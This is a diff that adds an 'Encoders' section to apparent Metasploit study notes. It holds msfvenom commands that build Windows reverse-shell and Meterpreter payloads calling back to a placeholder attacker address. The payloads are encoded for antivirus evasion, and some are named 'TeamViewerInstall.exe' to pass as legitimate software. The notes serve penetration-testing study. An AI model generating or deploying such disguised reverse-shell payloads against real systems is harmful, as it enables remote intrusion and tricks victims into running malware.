@@ -393,7 +393,39 @@ The Meterpreter payload is a specific type of multi-faceted payload that:
 <details>
 <summary><h3>Encoders</h3></summary>
 
-Text
+Encoders have assisted with making payloads compatible with different processor architectures while at the same time helping with antivirus evasion. These architectures include:
+
+- x64
+- x86
+- sparc
+- ppc
+- mips
+
+Encoders were packed separately from the msfconsole script and were called **msfpayload** and **msfencode**. These two tools are located in _/usr/share/framework2/_.
+
+**Generating Payload - Without Encoding**
+
+```bash
+msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<ATTACKER IP> LPORT=<ATTACKER PORT> -b "\x00" -f perl
+```  
+
+**Generating Payload - With Encoding**
+
+```bash
+msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<ATTACKER IP> LPORT=<ATTACKER PORT> -b "\x00" -f perl -e x86/shikata_ga_nai
+```  
+
+**Generate a payload with the exe format, called TeamViewerInstall.exe**
+```bash
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER IP> LPORT=<ATTACKER PORT> -e x86/shikata_ga_nai -f exe -o /root/Desktop/TeamViewerInstall.exe
+```  
+
+**Generate a payload with the exe format, called TeamViewerInstall.exe running it through multiple iterations**
+```bash
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER IP> LPORT=<ATTACKER PORT> -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
+```  
+
+As expected, most anti-virus products that we will encounter in the wild would still detect this payload so we would have to use other methods for AV evasion.
 
 </details>
 
